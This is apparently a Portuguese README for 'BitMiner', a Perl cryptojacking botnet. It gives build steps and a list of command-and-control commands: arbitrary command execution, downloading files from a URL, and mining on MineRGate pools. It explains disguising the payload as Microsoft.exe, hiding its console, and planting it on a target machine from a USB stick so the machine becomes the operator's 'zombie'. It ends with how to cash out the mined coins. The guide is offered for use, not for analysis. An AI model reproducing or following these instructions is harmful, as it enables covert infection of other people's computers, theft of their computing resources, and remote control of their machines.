1 - Windows ou Linux ?

Linux funciona se executado como root
O malware no Windows funciona para a arquitetura no qual foi compilada
Se você estiver no Windows, instale o StrawBerry Perl:
32bits - http://strawberryperl.com/download/5.26.0.2/strawberry-perl-5.26.0.2-32bit.msi
64bits - http://strawberryperl.com/download/5.26.0.2/strawberry-perl-5.26.0.2-64bit.msi

2 - Módulos (Bibliotecas necessárias)

Necessário ter o gcc instalado
Em seu terminal (cmd, ou seja lá o que for), execute estes comandos, lembrando que é
necessário ter o Perl instalado (obviamente):
cpan install Term::ANSIColor
cpan install LWP::UserAgent
cpan install LWP::Simple
(Linux utilize isso antes desse comando: sudo apt-get install libperl-dev) cpan install pp

3 - Utilizando o BitMiner 

Depois de ter feito isso, quando você executar o programa, ele perguntará qual o endereço do website controlador,
o que seria isso ? O website controlador é aonde você sinalizará os comandos para as máquinas infectadas, agora
vou mostrar uma lista de comandos disponíveis:

stop:3; - Dorme por 3 segundos, lembrando que o número ' 3 ' pode ser editado (obviamente)

exec:comando_do_sistema; - Executa um comando no sistema, lembrando que você não saberá a saída

get:URL_DO_ARQUIVO;name:NOME_QUE_O_ARQUIVO_RECEBERÁ; - Baixa o arquivo da URL (URL_DO_ARQUIVO) e nomeia o arquivo como
NOME_QUE_O_ARQUIVO_RECEBERÁ

miner->host:HOST_MINERGATE;email:SEU_EMAIL_DA_MINERGATE; - Será explicado em seguida

Para utilizá-lo, é necessário ter uma conta do Minergate (https://minergate.com/login), já que o programa utiliza o serviço
da Minergate para minerar, em seguida, você deve escolher um desses hosts, que no caso é a pool em que o BitMiner deve minerar:

bcn.pool.minergate.com:45550
xmr.pool.minergate.com:45560
qcn.pool.minergate.com:45570
xdn.pool.minergate.com:45620	
fcn.pool.minergate.com:45610	
mcn.pool.minergate.com:45640
dsh.pool.minergate.com:45720
inf8.pool.minergate.com:45750
xdn-xmr.pool.minergate.com:45790
fcn-xmr.pool.minergate.com:45590
fcn-qcn.pool.minergate.com:45600
fcn-dsh.pool.minergate.com:45730
fcn-inf8.pool.minergate.com:45760
mcn-qcn.pool.minergate.com:45670	
mcn-dsh.pool.minergate.com:45740
mcn-inf8.pool.minergate.com:45770

Agora deve ter ficado mais claro para você, então digamos que eu queria minerar Monero (XMR) para o email joaozinho123@hotmail.com,
seria utilizado isso: miner->host:xmr.pool.minergate.com:45560;email:joaozinho123@hotmail.com;

Nota: O BitMiner também pergunta se a máquina alvo irá minerar utilizando a CPU ou GPU, no caso, você especificará na
execução dele.

Depois de ter informado se é GPU ou CPU, e também o website controlador, se você instalou o gcc e todos os módulos, ele mostrará
uma mensagem de sucesso, e será criado três arquivos, Microsoft.exe (Vírus); Microsoft_init.exe; Move.exe (Programa que vai mover os arquivos na máquina alvo)

Tá, você deve ter estranhado o Microsoft_init.exe, o que ele faz ? Ele simplesmente é um programa escrito em C para esconder o console,
e iniciar o Microsoft.exe que ficará no %AppData%, mas pq você não fez o Microsoft.exe com uma função para esconder o console ? Simples,
o módulo (Ou biblioteca) do Perl para esconder o console é muito lenta, então optei por criar um programa em C para esconder o console,
e iniciar o Microsoft.exe no %AppData%, e o Move.exe quando executado na máquina alvo, copia o Microsoft.exe e Microsoft_init.exe para seus devidos locais.

Então resumindo, você deve ter os três arquivos no mesmo diretório e executar o Move.exe.

Por exemplo, você chega na máquina alvo com os três arquivos no pendrive, e quando você abre ele, você o executa (Move.exe) e ele move rapidamente os arquivos e ainda inicia o Microsoft_init.exe, lembrando que como o programa já vai estar sendo executado (Microsoft_init.exe) você já pode remover o pendrive, e shazam, a máquina já vai ser um zumbi seu :)

Como sacar ? Vá no minergate.com/login, coloque suas credenciais (E-mail e Senha) depois vá em minergate.com/internal, selecione a
moeda que você quer sacar e clique em Withdraw, o resto é com você
